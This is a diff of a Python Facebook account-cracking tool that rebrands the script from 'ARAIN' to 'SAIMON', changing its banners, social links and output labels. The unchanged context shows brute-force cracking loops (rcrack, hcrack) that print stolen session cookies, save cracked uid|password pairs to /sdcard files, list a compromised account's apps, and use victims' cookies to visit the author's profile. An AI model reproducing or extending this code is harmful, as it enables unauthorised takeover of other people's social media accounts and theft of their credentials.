@@ -126,13 +126,13 @@ logo3 = '   \n\x1b[1;32m       d8888 8888888b.  8888888 Y88b   d88P     d8888 88
 
 def linex():
 
-	print('\033[1;32m')def ud():
+	print('\033[1;32m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')def ud():
 
     os.system('clear')
 
     jalan(logo)
 
-    print(' [1] FOLLOW ME ON WhatsApp')
+    print(' [1] FOLLOW ME ON FB')
 
     print(' [2] EXIT')
 
@@ -140,7 +140,7 @@ def linex():
 
     if opt == '1':
 
-        os.system('https://chat.whatsapp.com/JvSx29SgcxB2ScAosnntdN')
+        os.system('xdg-open https://www.facebook.com/Saimonk189')
 
         FD()
 
@@ -154,7 +154,7 @@ def FD():
 
     print(logo)
 
-    print('\x1b[1;33m [1] JOIN MY WHATSAPP GROUP')
+    print('\x1b[1;33m [1] JOIN MY FACEBOOK GROUP')
 
     print(' [2] EXIT')
 
@@ -162,7 +162,7 @@ def FD():
 
     if opt == '1':
 
-        os.system('https://chat.whatsapp.com/JvSx29SgcxB2ScAosnntdN')
+        os.system('xdg-open https://facebook.com/groups/481018527519972/')
 
         o()
 
@@ -226,7 +226,7 @@ def o():
 
     if opt == '4':
 
-        os.system('xdg-open https://www.facebook.com/ARAINk189')   
+        os.system('xdg-open https://www.facebook.com/Saimonk189')   
 
         
 
@@ -288,7 +288,7 @@ def cek_apk(session,coki):
 
     else:
 
-        print(f'\r[ARAIN] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
+        print(f'\r[SAIMON] %s \x1b[1;95m â˜† Your Active Apps â˜†     :{WHITE}'%(GREEN))
 
         for i in range(len(game)):
 
@@ -312,7 +312,7 @@ def cek_apk(session,coki):
 
     else:
 
-        print(f'\r[ARAIN] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
+        print(f'\r[SAIMON] %s \x1b[1;95m â—‡ Your Expired Apps â—‡    :{WHITE}'%(M))
 
         for i in range(len(game)):
 
@@ -326,7 +326,7 @@ def cek_apk(session,coki):
 
 def follow(self, session, coki):
 
-        r = BeautifulSoup(session.get('https://www.facebook.com/ARAINk189', {
+        r = BeautifulSoup(session.get('https://www.facebook.com/Saimonk189', {
 
             'cookie': coki }, **('cookies',)).text, 'html.parser')
 
@@ -425,34 +425,38 @@ today = date.today()
 logo =                                          ("""   
 
 ┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑
- \033[1;31m  ______                      __           
-  \033[1;32m/      \                    |  \          
- \033[1;33m|  $$$$$$\  ______   ______   \$$ _______  
- \033[1;34m| $$__| $$ /      \ |      \ |  \|       \ 
- \033[1;35m| $$    $$|  $$$$$$\ \$$$$$$\| $$| $$$$$$$\
- \033[1;36m| $$$$$$$$| $$   \$$/      $$| $$| $$  | $$
- \033[1;37m| $$  | $$| $$     |  $$$$$$$| $$| $$  | $$
- \033[1;30m| $$  | $$| $$      \$$    $$| $$| $$  | $$
- \033[1;31m \$$   \$$ \$$       \$$$$$$$ \$$ \$$   \$$                                                                                                                        
+
+┃\033[1;91m    _____         _____ __  __  ____  _   _ ┃
+
+┃  / ____|  /\   |_   _|  \/  |/ __ \| \ | | ┃
+
+┃ | (___   /  \    | | | \  / | |  | |  \| | ┃
+
+┃\033[1;97m  \___ \ / /\ \   | | | |\/| | |  | | . ` | ┃
+
+┃  ____) / ____ \ _| |_| |  | | |__| | |\  | ┃
+
+┃ |_____/_/    \_\_____|_|  |_|\____/|_| \_|©┃
+
 └━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┘
 
-\033[1;32m┌━━━━━━━━━━━━━━━━━ \033[1;97mARAIN\33[0;m \033[1;32m━━━━━━━━━━━━━━━━━━┑
+\033[1;32m┌━━━━━━━━━━━━━━━━━ \033[1;97mSAIMON\33[0;m \033[1;32m━━━━━━━━━━━━━━━━━━┑
 
-\033[1;32m┃   \033[1;32mCREATED BY\33[0;m   :  \033[1;32mARAIN.CYBER            ┃
+\033[1;32m┃   \033[1;32mCREATED BY\33[0;m   :  \033[1;32mSAIMON.CYBER            ┃
 
-┃   \033[1;32mFACEBOK      : \033[1;32mSHERAZ-ARAIN              ┃
+┃   \033[1;32mFACEBOK      : \033[1;32m SAIMONk189              ┃
 
-┃   \033[1;32mCONTACT      :  \033[1;32m+971564382087        ┃
+┃   \033[1;32mGITHUB       :  \033[1;32mSAIMUN.CYBER.403        ┃
 
 ┃   \033[1;32mTOOL STATUS  :  \033[1;32mTOOL IS FREE            ┃
 
-┃   \033[1;32mTEAM         :  \033[1;32mARAIN                 ┃
+┃   \033[1;32mTEAM         :  \033[1;32mPRIVATE                 ┃
 
 ┃   \033[1;32mTOOL VIRSION :  \033[1;32m1.3                     ┃
 
 ┃   \033[1;32mTOOL WORK    :  \033[1;32mONLY DATA               ┃
 
-└━━━━━━━━━━━━━━━━━ \033[1;97mARAIN\33[0;m \033[1;32m━━━━━━━━━━━━━━━━━━┘
+└━━━━━━━━━━━━━━━━━ \033[1;97mSAIMON\33[0;m \033[1;32m━━━━━━━━━━━━━━━━━━┘
 
 \033[1;37m┌━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┑
 
@@ -832,11 +836,11 @@ def rcrack(uid,pwx,tl):
 
                 cid = coki[7:22]
 
-                print('    \033[1;32m(ARAIN-OK)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
+                print('    \033[1;32m(SAIMON-OK)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
 
                 cek_apk(session,coki)
 
-                open('/sdcard/ARAIN-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/SAIMON-OK.txt', 'a').write( uid+' | '+ps+'\n')
 
                 oks.append(cid)
 
@@ -848,9 +852,9 @@ def rcrack(uid,pwx,tl):
 
                 cid = coki[24:39]
 
-                print('    \33[1;30m(ARAIN-CP)  ' +uid+ ' | ' +ps+           '  \33[0;97m')
+                print('    \33[1;30m(SAIMON-CP)  ' +uid+ ' | ' +ps+           '  \33[0;97m')
 
-                open('/sdcard/ARAIN-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                open('/sdcard/SAIMON-CP.txt', 'a').write( uid+' | '+ps+' \n')
 
                 cps.append(cid)
 
@@ -862,7 +866,7 @@ def rcrack(uid,pwx,tl):
 
         loop+=1
 
-        sys.stdout.write('\r     %s[ARAIN😍] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.write('\r     %s[SAIMON] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
 
         sys.stdout.flush()
 
@@ -1180,11 +1184,11 @@ def hcrack(uid,pwx,tl):
 
                 cid = coki[7:22]
 
-                print('    \033[1;32m(ARAIN-OK)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
+                print('    \033[1;32m(SAIMON-OK)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
 
                 cek_apk(session,coki)
 
-                open('/sdcard/ARAIN-OK.txt', 'a').write( uid+' | '+ps+'\n')
+                open('/sdcard/SAIMON-OK.txt', 'a').write( uid+' | '+ps+'\n')
 
                 oks.append(cid)
 
@@ -1196,9 +1200,9 @@ def hcrack(uid,pwx,tl):
 
                 cid = coki[24:39]
 
-                print('    \33[1;30m(ARAIN-CP)  ' +uid+ ' | ' +ps+           '  \33[0;97m')
+                print('    \33[1;30m(SAIMON-CP)  ' +uid+ ' | ' +ps+           '  \33[0;97m')
 
-                open('/sdcard/ARAIN-CP.txt', 'a').write( uid+' | '+ps+' \n')
+                open('/sdcard/SAIMON-CP.txt', 'a').write( uid+' | '+ps+' \n')
 
                 cps.append(cid)
 
@@ -1210,7 +1214,7 @@ def hcrack(uid,pwx,tl):
 
         loop+=1
 
-        sys.stdout.write('\r     %s[ARAIN😍] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.write('\r     %s[SAIMON] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
 
         sys.stdout.flush()
 
